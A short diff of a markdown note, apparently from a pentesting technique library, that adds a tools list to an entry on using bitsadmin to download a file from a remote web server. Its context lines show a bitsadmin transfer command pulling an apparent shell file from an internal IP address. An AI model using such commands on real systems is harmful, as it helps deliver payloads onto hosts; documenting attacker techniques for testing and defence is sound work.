@@ -9,6 +9,9 @@ output: "C:\\>bitsadmin.exe /transfer \"foo\" /download http://10.10.10.100/shel
   PRIORITY: NORMAL FILES: 1 / 1 BYTES: 7168 / 7168 (100%)\nTransfer complete."
 created_at: '2019-11-20T19:04:07.107221+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[BITSAdmin]]'
+- '[[type]]'
 ---
 
 # Bitsadmin Download File from a Remote Web Server
